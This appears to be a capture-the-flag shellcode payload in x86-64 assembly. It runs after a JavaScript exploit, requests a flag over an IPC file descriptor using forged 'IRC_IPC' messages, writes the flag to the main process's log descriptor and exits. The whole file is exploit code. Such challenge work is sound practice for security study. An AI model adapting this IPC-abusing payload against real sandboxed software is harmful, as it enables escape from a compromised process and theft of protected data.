# save shellcode_ctx from javascript
mov [rip + ctx], rdx
# call IPC_REQUEST_FLAG
mov rax, 1
mov rdi, 4
lea rsi, [rip + ipc]
mov rdx, 0x28
syscall
# read FLAG returned from IPC
mov rax, 0
mov rdi, 4
lea rsi, [rip + flag]
mov rdx, 0x30
syscall
# write FLAG to the LOG fd in main process
mov rax, 1
mov rdi, 6
lea rsi, [rip + flag]
mov rdx, 0x30
syscall
# call IPC_SUCCESS
mov rax, 1
mov rdi, 4
lea rsi, [rip + iipc]
mov rdx, 0x28
syscall
# exit cleanly
mov rax, 60
mov rdi, 0x1337
syscall

# variables
ctx: .quad 0x0
ipc: .asciz "IRC_IPC"
ipc_id: .quad 0xac1d1337
ipc_debug: .quad 0x1
ipc_status: .quad 0x0
ipc_ptr: .quad 0x0
iipc: .asciz "IRC_IPC"
iipc_id: .quad 0xac1d0001
iipc_debug: .quad 0x1
iipc_status: .quad 0x0
iipc_ptr: .quad 0x0
flag: .asciz "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
